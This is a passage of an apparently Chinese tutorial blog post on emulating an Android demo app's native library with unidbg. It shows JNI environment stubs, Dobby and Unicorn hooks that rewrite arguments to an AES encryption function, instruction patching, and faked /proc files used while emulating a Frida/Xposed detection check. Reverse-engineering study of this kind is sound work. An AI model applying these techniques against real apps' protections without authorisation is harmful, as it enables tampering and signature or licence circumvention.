class="operator">=</span> dvmClass.newObject(<span class="literal">null</span>);</span><br><span class="line">        <span class="type">DvmObject</span> <span class="variable">dvmObject1</span> <span class="operator">=</span> dvmObject.callJniMethodObject(androidEmulator, <span class="string">&quot;getHash(Ljava/lang/String;)Ljava/lang/String;&quot;</span>, apk_path);</span><br><span class="line">        System.out.println(dvmObject1.getValue());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> DvmObject&lt;?&gt; newObjectV(BaseVM vm, DvmClass dvmClass, String signature, VaList vaList) &#123;</span><br><span class="line">        <span class="keyword">switch</span> (signature)&#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&quot;java/util/zip/ZipFile-&gt;&lt;init&gt;(Ljava/lang/String;)V&quot;</span>:&#123;</span><br><span class="line">                <span class="comment">// return vm.resolveClass(&quot;java/util/zip/ZipFile&quot;).newObject(signature);</span></span><br><span class="line">                <span class="comment">// 没有具体调用方法就new，括号内是参数类型</span></span><br><span class="line">                <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> (String) vaList.getObjectArg(<span class="number">0</span>).getValue();</span><br><span class="line">                <span class="keyword">if</span>(path.equals(<span class="string">&quot;/data/app/com.example.hookdemo-qmoUcGSJuvbQaByYAxdvOg==/base.apk&quot;</span>))&#123;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        <span class="type">ZipFile</span> <span class="variable">zipFile</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ZipFile</span>(<span class="string">&quot;unidbg-android/src/test/java/lesson/testJNI/app-debug.apk&quot;</span>);</span><br><span class="line">                        <span class="keyword">return</span> vm.resolveClass(<span class="string">&quot;java/util/zip/ZipFile&quot;</span>).newObject(zipFile);</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>.newObjectV(vm, dvmClass, signature, vaList);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> DvmObject&lt;?&gt; callObjectMethodV(BaseVM vm, DvmObject&lt;?&gt; dvmObject, String signature, VaList vaList) &#123;</span><br><span class="line">        <span class="keyword">switch</span> (signature)&#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&quot;java/util/zip/ZipFile-&gt;entries()Ljava/util/Enumeration;&quot;</span>:&#123;</span><br><span class="line">                <span class="comment">// dvmObject获取当前对象</span></span><br><span class="line">                <span class="comment">// signature 是package</span></span><br><span class="line">                <span class="comment">// vaList获取参数</span></span><br><span class="line">                <span class="comment">// 此处无括号是返回类型</span></span><br><span class="line">                <span class="type">ZipFile</span> <span class="variable">zipFile</span> <span class="operator">=</span> (ZipFile) dvmObject.getValue();</span><br><span class="line">                Enumeration&lt;? <span class="keyword">extends</span> <span class="title class_">ZipEntry</span>&gt; entries = zipFile.entries();</span><br><span class="line">                <span class="comment">// java内置zip</span></span><br><span class="line">                <span class="type">DvmClass</span> <span class="variable">ZipEntryClass</span> <span class="operator">=</span> vm.resolveClass(<span class="string">&quot;java/util/zip/ZipEntry&quot;</span>);</span><br><span class="line"></span><br><span class="line">                List&lt;DvmObject&lt;?&gt;&gt; objs = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">                <span class="keyword">while</span> (entries.hasMoreElements())&#123;</span><br><span class="line">                    <span class="type">ZipEntry</span> <span class="variable">zipEntry</span> <span class="operator">=</span> entries.nextElement();</span><br><span class="line">                    objs.add(ZipEntryClass.newObject(zipEntry));</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">com</span>.github.unidbg.linux.android.dvm.Enumeration(dalvikVM,objs);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&quot;java/util/zip/ZipEntry-&gt;getName()Ljava/lang/String;&quot;</span>:&#123;</span><br><span class="line">                <span class="type">ZipEntry</span> <span class="variable">zipEntry</span> <span class="operator">=</span> (ZipEntry) dvmObject.getValue();</span><br><span class="line">                <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> zipEntry.getName();</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">StringObject</span>(dalvikVM,name);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&quot;java/util/zip/ZipFile-&gt;getInputStream(Ljava/util/zip/ZipEntry;)Ljava/io/InputStream;&quot;</span>: &#123;</span><br><span class="line">                <span class="comment">// 括号内是参数类型，外边是返回类型</span></span><br><span class="line">                <span class="type">ZipFile</span> <span class="variable">zipFile</span> <span class="operator">=</span> (ZipFile) dvmObject.getValue();</span><br><span class="line">                <span class="type">ZipEntry</span> <span class="variable">zipEntry</span> <span class="operator">=</span> (ZipEntry) vaList.getObjectArg(<span class="number">0</span>).getValue();</span><br><span class="line"></span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> zipFile.getInputStream(zipEntry);</span><br><span class="line">                    <span class="keyword">return</span> vm.resolveClass(<span class="string">&quot;java/io/InputStream&quot;</span>).newObject(inputStream);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&quot;java/security/MessageDigest-&gt;digest()[B&quot;</span>:&#123;</span><br><span class="line">                <span class="comment">// 返回类型是byte</span></span><br><span class="line">                <span class="type">MessageDigest</span> <span class="variable">messageDigest</span> <span class="operator">=</span> (MessageDigest) dvmObject.getValue();</span><br><span class="line">                <span class="type">byte</span>[] digest = messageDigest.digest();</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ByteArray</span>(dalvikVM,digest);</span><br><span class="line">            &#125;</span><br><span class="line">                <span class="comment">// 仿写</span></span><br><span class="line"><span class="comment">//case &quot;android/app/ActivityThread-&gt;getApplication()Landroid/app/Application;&quot;:</span></span><br><span class="line">	<span class="comment">//return vm.resolveClass(&quot;android/app/Application&quot;,</span></span><br><span class="line">			<span class="comment">//vm.resolveClass(&quot;android/content/ContextWrapper&quot;,</span></span><br><span class="line">					<span class="comment">//vm.resolveClass(&quot;android/content/Context&quot;))).newObject(signature);</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>.callObjectMethodV(vm, dvmObject, signature, vaList);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">callIntMethodV</span><span class="params">(BaseVM vm, DvmObject&lt;?&gt; dvmObject, String signature, VaList vaList)</span> &#123;</span><br><span class="line">        <span class="keyword">switch</span> (signature)&#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&quot;java/io/InputStream-&gt;read([B)I&quot;</span>:&#123;</span><br><span class="line">                <span class="comment">// 参数byte，默认返回</span></span><br><span class="line">                <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> (InputStream) dvmObject.getValue();</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="type">int</span> <span class="variable">read</span> <span class="operator">=</span> inputStream.read((<span class="type">byte</span>[]) vaList.getObjectArg(<span class="number">0</span>).getValue());</span><br><span class="line">                    <span class="keyword">return</span> read;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>.callIntMethodV(vm, dvmObject, signature, vaList);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">callVoidMethodV</span><span class="params">(BaseVM vm, DvmObject&lt;?&gt; dvmObject, String signature, VaList vaList)</span> &#123;</span><br><span class="line">        <span class="keyword">switch</span> (signature)&#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&quot;java/security/MessageDigest-&gt;update([B)V&quot;</span>:&#123;</span><br><span class="line">                <span class="type">MessageDigest</span> <span class="variable">messageDigest</span> <span class="operator">=</span> (MessageDigest) dvmObject.getValue();</span><br><span class="line">                messageDigest.update((<span class="type">byte</span>[]) vaList.getObjectArg(<span class="number">0</span>).getValue());</span><br><span class="line">                <span class="keyword">return</span> ;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&quot;java/io/InputStream-&gt;close()V&quot;</span> :&#123;</span><br><span class="line">                <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> (InputStream) dvmObject.getValue();</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    inputStream.close();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> ;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">super</span>.callVoidMethodV(vm, dvmObject, signature, vaList);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="IDA-编译名转换"><a href="#IDA-编译名转换" class="headerlink" title="IDA 编译名转换"></a>IDA 编译名转换</h2><p><a href="http://demangler.com/">http://demangler.com/</a></p>
<h2 id="Dobby-amp-Unicorn"><a href="#Dobby-amp-Unicorn" class="headerlink" title="Dobby&amp;Unicorn"></a>Dobby&amp;Unicorn</h2><p>需要在onload之前hook</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">module</span> = dalvikModule.getModule();</span><br><span class="line">hookDobby();</span><br><span class="line">hookUnicorn();</span><br><span class="line"><span class="comment">//相当于在SO加载前hook已经生效，但未实际调用，待后续调用时才触发hook</span></span><br><span class="line">dalvikModule.callJNI_OnLoad(androidEmulator);</span><br></pre></td></tr></table></figure>



<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">hookUnicorn</span><span class="params">()</span> &#123;</span><br><span class="line">	androidEmulator.attach().addBreakPoint(<span class="keyword">module</span>.findSymbolByName(<span class="string">&quot;AES_ECB_PKCS7_Encrypt&quot;</span>).getAddress(), <span class="keyword">new</span> <span class="title class_">BreakPointCallback</span>() &#123;</span><br><span class="line">		<span class="meta">@Override</span></span><br><span class="line">		<span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">onHit</span><span class="params">(Emulator&lt;?&gt; emulator, <span class="type">long</span> address)</span> &#123;</span><br><span class="line">			System.out.println(emulator.getContext().getPointerArg(<span class="number">0</span>).getString(<span class="number">0</span>));</span><br><span class="line">			emulator.getBackend().reg_write(Arm64Const.UC_ARM64_REG_PC,emulator.getContext().getLRPointer().peer);</span><br><span class="line">            		<span class="comment">//修改入参</span></span><br><span class="line">			emulator.getBackend().reg_write(Arm64Const.UC_ARM64_REG_X0,<span class="number">0</span>);</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">hookDobby</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">Dobby</span> <span class="variable">dobby</span> <span class="operator">=</span> Dobby.getInstance(androidEmulator);</span><br><span class="line">    dobby.replace(<span class="keyword">module</span>.findSymbolByName(<span class="string">&quot;AES_ECB_PKCS7_Encrypt&quot;</span>).getAddress(), <span class="keyword">new</span> <span class="title class_">ReplaceCallback</span>() &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> HookStatus <span class="title function_">onCall</span><span class="params">(Emulator&lt;?&gt; emulator, HookContext context, <span class="type">long</span> originFunction)</span> &#123;</span><br><span class="line">            <span class="comment">//System.out.println(&quot;jinru&quot;);</span></span><br><span class="line">            <span class="comment">//获取参数</span></span><br><span class="line">            <span class="comment">//类似于hexdump</span></span><br><span class="line">            <span class="comment">//Inspector.inspect(context.getPointerArg(1).getByteArray(0,100),&quot;教学&quot;);</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">//修改参数</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">fakeargs1</span> <span class="operator">=</span> <span class="string">&quot;Hello world&quot;</span>;</span><br><span class="line">            <span class="comment">//得到长度</span></span><br><span class="line">            <span class="type">int</span> <span class="variable">length</span> <span class="operator">=</span> fakeargs1.length();</span><br><span class="line">            <span class="comment">//开辟一段内存空间</span></span><br><span class="line">            <span class="type">MemoryBlock</span> <span class="variable">fakeargs1malloc</span> <span class="operator">=</span> emulator.getMemory().malloc(length, <span class="literal">true</span>);</span><br><span class="line">            <span class="comment">//往内存空间写入数据</span></span><br><span class="line">            fakeargs1malloc.getPointer().write(fakeargs1.getBytes(StandardCharsets.UTF_8));</span><br><span class="line">            <span class="comment">//映射到寄存器</span></span><br><span class="line">            emulator.getBackend().reg_write(Arm64_const.ARM64_REG_X0,fakeargs1malloc.getPointer().peer);</span><br><span class="line">            <span class="comment">//String arg1 = context.getPointerArg(0).getString(0);</span></span><br><span class="line">            <span class="comment">//System.out.println(&quot;第一个参数-&gt;&quot;+arg1);</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">//context.push(context.getPointerArg(1));</span></span><br><span class="line">            <span class="comment">//emulator.getBackend().reg_write(Arm64_const.ARM64_REG_X0,0);</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">//return super.onCall(emulator, context, context.getLR());</span></span><br><span class="line">            <span class="keyword">return</span> HookStatus.RET(emulator,context.getLR());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">postCall</span><span class="params">(Emulator&lt;?&gt; emulator, HookContext context)</span> &#123;</span><br><span class="line"></span><br><span class="line">            <span class="comment">//得到返回值</span></span><br><span class="line">            <span class="comment">//System.out.println(context.getPointerArg(0).getString(0));</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">//修改返回值</span></span><br><span class="line">            <span class="comment">//String fakeargs1 = &quot;Hello world&quot;;</span></span><br><span class="line">            <span class="comment">//得到长度</span></span><br><span class="line">            <span class="comment">//int length = fakeargs1.length();</span></span><br><span class="line">            <span class="comment">//开辟一段内存空间</span></span><br><span class="line">            <span class="comment">//MemoryBlock fakeargs1malloc = emulator.getMemory().malloc(length, true);</span></span><br><span class="line">            <span class="comment">//往内存空间写入数据</span></span><br><span class="line">		    <span class="comment">//fakeargs1malloc.getPointer().write(fakeargs1.getBytes(StandardCharsets.UTF_8));</span></span><br><span class="line">            <span class="comment">//映射到寄存器</span></span><br><span class="line">		    <span class="comment">//emulator.getBackend().reg_write(Arm64_const.ARM64_REG_X0,fakeargs1malloc.getPointer().peer);</span></span><br><span class="line">            <span class="comment">//Pointer pop = context.pop();</span></span><br><span class="line">            <span class="comment">//System.out.println(&quot;离开函数查看第二个参数-&gt;&quot;+pop.getString(0));</span></span><br><span class="line">            <span class="built_in">super</span>.postCall(emulator, context);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,<span class="literal">true</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="path-so"><a href="#path-so" class="headerlink" title="path_so"></a>path_so</h2><p><a href="https://armconverter.com/">https://armconverter.com/</a></p>
<p>这个path的功能能否用hook实现</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">patch1</span><span class="params">()</span> &#123;</span><br><span class="line">	<span class="type">UnidbgPointer</span> <span class="variable">pointer</span> <span class="operator">=</span> UnidbgPointer.pointer(androidEmulator, <span class="keyword">module</span>.base + <span class="number">0xE444</span>);</span><br><span class="line">	<span class="type">byte</span>[] code = <span class="keyword">new</span> <span class="title class_">byte</span>[]&#123;<span class="number">0x40</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>&#125;;</span><br><span class="line">	pointer.write(code);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">patch2</span><span class="params">()</span> &#123;</span><br><span class="line">	<span class="type">UnidbgPointer</span> <span class="variable">pointer</span> <span class="operator">=</span> UnidbgPointer.pointer(androidEmulator, <span class="keyword">module</span>.base + <span class="number">0xE444</span>);</span><br><span class="line">	<span class="type">Keystone</span> <span class="variable">keystone</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Keystone</span>(KeystoneArchitecture.Arm64, KeystoneMode.LittleEndian);</span><br><span class="line">	<span class="type">String</span> <span class="variable">huibian</span> <span class="operator">=</span> <span class="string">&quot;cbz w0, #0x28&quot;</span>; <span class="comment">// 40010034</span></span><br><span class="line">	<span class="type">byte</span>[] machineCode = keystone.assemble(huibian).getMachineCode();</span><br><span class="line">	pointer.write(machineCode);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="文件访问-IO-流补环境"><a href="#文件访问-IO-流补环境" class="headerlink" title="文件访问 IO 流补环境"></a>文件访问 IO 流补环境</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">testIO</span> <span class="keyword">extends</span> <span class="title class_">AbstractJni</span> <span class="keyword">implements</span> <span class="title class_">IOResolver</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> AndroidEmulator androidEmulator;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Memory memory;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> VM dalvikVM;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> DalvikModule dalvikModule;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Module <span class="keyword">module</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">testIO</span><span class="params">()</span> &#123;</span><br><span class="line">        androidEmulator = AndroidEmulatorBuilder</span><br><span class="line">                .for64Bit()</span><br><span class="line">                .addBackendFactory(<span class="keyword">new</span> <span class="title class_">Unicorn2Factory</span>(<span class="literal">true</span>))</span><br><span class="line">                .setProcessName(<span class="string">&quot;com.example.hookdemo&quot;</span>)</span><br><span class="line">                <span class="comment">//创建根目录</span></span><br><span class="line">                .setRootDir(<span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;target/rootfs&quot;</span>))</span><br><span class="line">                .build();</span><br><span class="line">        memory = androidEmulator.getMemory();</span><br><span class="line">        memory.setLibraryResolver(<span class="keyword">new</span> <span class="title class_">AndroidResolver</span>(<span class="number">23</span>));</span><br><span class="line">        dalvikVM = androidEmulator.createDalvikVM(<span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;unidbg-android/src/test/java/lesson/testIO/app-debug.apk&quot;</span>));</span><br><span class="line">        dalvikVM.setJni(<span class="built_in">this</span>);</span><br><span class="line">        dalvikVM.setVerbose(<span class="literal">true</span>);</span><br><span class="line">        dalvikModule = dalvikVM.loadLibrary(<span class="string">&quot;hookdemo&quot;</span>, <span class="literal">true</span>);</span><br><span class="line">        androidEmulator.getSyscallHandler().addIOResolver(<span class="built_in">this</span>);</span><br><span class="line">        <span class="comment">//androidEmulator.getSyscallHandler().addIOResolver(new buwenjian());</span></span><br><span class="line">        <span class="keyword">module</span> = dalvikModule.getModule();</span><br><span class="line">        dalvikModule.callJNI_OnLoad(androidEmulator);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">testIO</span> <span class="variable">testIO</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">testIO</span>();</span><br><span class="line">        testIO.jiance_xp_frida();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">jiance_xp_frida</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">DvmClass</span> <span class="variable">dvmClass</span> <span class="operator">=</span> dalvikVM.resolveClass(<span class="string">&quot;com.example.hookdemo.MainActivity&quot;</span>);</span><br><span class="line">        DvmObject&lt;?&gt; dvmObject = dvmClass.newObject(<span class="literal">null</span>);</span><br><span class="line">        DvmObject&lt;?&gt; dvmObject1 = dvmObject.callJniMethodObject(androidEmulator, <span class="string">&quot;jiance_xp_frida()Ljava/lang/String;&quot;</span>);</span><br><span class="line">        System.out.println(dvmObject1.getValue());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> FileResult <span class="title function_">resolve</span><span class="params">(Emulator emulator, String pathname, <span class="type">int</span> oflags)</span> &#123;</span><br><span class="line">        <span class="keyword">switch</span> (pathname)&#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&quot;/sys/class/thermal/&quot;</span>:&#123;</span><br><span class="line">                <span class="keyword">return</span> FileResult.&lt;AndroidFileIO&gt;success(<span class="keyword">new</span> <span class="title class_">DirectoryFileIO</span>(oflags,pathname,<span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;target/rootfs/sys/class/thermal&quot;</span>)));</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&quot;/data&quot;</span>:&#123;</span><br><span class="line">                <span class="keyword">return</span> FileResult.failed(UnixEmulator.EACCES);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&quot;/proc/self/cmdline&quot;</span>:&#123;</span><br><span class="line">                <span class="comment">//return FileResult.&lt;AndroidFileIO&gt;success(new SimpleFileIO(oflags,new File(&quot;unidbg-android/src/test/java/com/lesson/testIO/cmdline&quot;),pathname ));</span></span><br><span class="line">                <span class="keyword">return</span> FileResult.&lt;AndroidFileIO&gt;success(<span class="keyword">new</span> <span class="title class_">ByteArrayFileIO</span>(oflags,pathname,<span class="string">&quot;com.example.hookdemo\0&quot;</span>.getBytes()));</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&quot;/proc/self/maps&quot;</span>:&#123;</span><br><span class="line">                <span class="comment">//return FileResult.&lt;AndroidFileIO&gt;success(new MapsFileIO(emulator,oflags,pathname,emulator.getMemory().getLoadedModules()));</span></span><br><span class="line">                <span class="keyword">return</span> FileResult.&lt;AndroidFileIO&gt;success(<span class="keyword">new</span> <span class="title class_">SimpleFileIO</span>(oflags,<span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;unidbg-android/src/test/java/lesson/testIO/maps&quot;</span>),pathname ));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;file open-&gt; &quot;</span>+pathname);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="系统补环境"><a href="#系统补环境" class="headerlink" title="系统补环境"></a>系统补环境</h2><p><a href="https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md">https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md</a></p>
<p>判断是JNI调用还是系统调用</p>
<ul>
<li>svcNumber&#x3D;0x0的是系统调用，NR调用号，ARM64调用号</li>
<li>补环境要补哪个方法，根据NR调用号决定</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">JNI</span><br><span class="line">[<span class="number">17</span>:<span class="number">19</span>:<span class="number">05</span> <span class="number">115</span>]  WARN [com.github.unidbg.linux.ARM64SyscallHandler] (ARM64SyscallHandler:<span class="number">399</span>) - handleInterrupt </span><br><span class="line">intno=<span class="number">2</span>, NR=-<span class="number">128672</span>, </span><br><span class="line">svcNumber=<span class="number">0x18d</span>, PC=unidbg@<span class="number">0xfffe0964</span>, LR=RX@<span class="number">0x40012b88</span>[libhookdemo.so]<span class="number">0x12b88</span>, syscall=<span class="literal">null</span></span><br><span class="line">java.lang.UnsupportedOperationException: android/os/Build-&gt;MODEL:Ljava/lang/String;</span><br><span class="line">	at com.github.unidbg.linux.android.dvm.AbstractJni.getStaticObjectField(AbstractJni.java:<span class="number">103</span>)</span><br><span class="line">	at com.github.unidbg.linux.android.dvm.AbstractJni.getStaticObjectField(AbstractJni.java:<span class="number">53</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">调用到系统API：</span><br><span class="line">[<span class="number">17</span>:<span class="number">22</span>:<span class="number">56</span> <span class="number">521</span>]  WARN [com.github.unidbg.linux.ARM64SyscallHandler] (ARM64SyscallHandler:<span class="number">399</span>) - handleInterrupt </span><br><span class="line">intno=<span class="number">2</span>, </span><br><span class="line">NR=<span class="number">165</span>, </span><br><span class="line">svcNumber=<span class="number">0x0</span>, PC=RX@<span class="number">0x401ca3d4</span>[libc.so]<span class="number">0x6a3d4</span>, LR=RX@<span class="number">0x40011f28</span>[libhookdemo.so]<span class="number">0x11f28</span>, syscall=<span class="literal">null</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>补系统的环境：</p>
<h3 id="1、硬编码返回"><a href="#1、硬编码返回" class="headerlink" title="1、硬编码返回"></a>1、硬编码返回</h3><p>hook下某个系统API的返回值，按一定格式返回</p>
<table>
<thead>
<tr>
<th>NR</th>
<th>syscall name</th>
<th>references</th>
<th>%rax</th>
<th>arg0 (%rdi)</th>
<th>arg1 (%rsi)</th>
<th>arg2 (%rdx)</th>
<th>arg3 (%r10)</th>
</tr>
</thead>
<tbody><tr>
<td>165</td>
<td>getrusage</td>
<td>man&#x2F; cs&#x2F;</td>
<td>0xa5</td>
<td>int who</td>
<td>struct rusage *ru</td>
<td></td>
<td></td>
</tr>
</tbody></table>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Interceptor.attach(Module.findExportByName(<span class="string">&quot;libc.so&quot;</span>, <span class="string">&quot;getrusage&quot;</span>), &#123;</span><br><span class="line">    onEnter: function (args) &#123;</span><br><span class="line">        <span class="built_in">this</span>.rusage = args[<span class="number">1</span>]</span><br><span class="line">    &#125;,</span><br><span class="line">    onLeave: function (retval) &#123;</span><br><span class="line">        console.log(hexdump(<span class="built_in">this</span>.rusage,&#123;length: <span class="number">144</span>&#125;))</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// hook到的系统API返回的内存值</span></span><br><span class="line">7ff4b68f58  <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">70</span> f3 <span class="number">05</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  ........p.......                   </span><br><span class="line">7ff4b68f68  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">30</span> <span class="number">57</span> <span class="number">05</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  ........0W......                   </span><br><span class="line">7ff4b68f78  <span class="number">10</span> <span class="number">64</span> <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  .d..............                   </span><br><span class="line">7ff4b68f88  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  ................                   </span><br><span class="line">7ff4b68f98  ff a5 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">98</span> <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  ................                   </span><br><span class="line">7ff4b68fa8  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> f0 7e <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  .........~......                   </span><br><span class="line">7ff4b68fb8  